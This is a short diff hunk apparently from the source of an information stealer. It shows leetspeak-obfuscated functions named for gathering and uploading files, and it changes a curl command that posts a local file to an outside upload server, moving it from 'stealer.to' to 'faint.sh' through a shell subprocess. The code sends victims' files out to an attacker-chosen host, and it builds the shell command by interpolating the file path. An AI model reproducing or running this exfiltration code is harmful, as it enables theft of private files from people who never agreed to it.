@@ -1077,7 +1077,7 @@ def G47H3r411():
 def UP104D7060F113(path):
     try:
         r = subprocess.Popen(
-            f'curl -F "file=@{path}" https://stealer.to/uploads',
+            f'curl -F "file=@{path}" https://faint.sh/uploads',
             shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
         ).communicate()
         json_response = loads(r[0].decode('utf-8'))
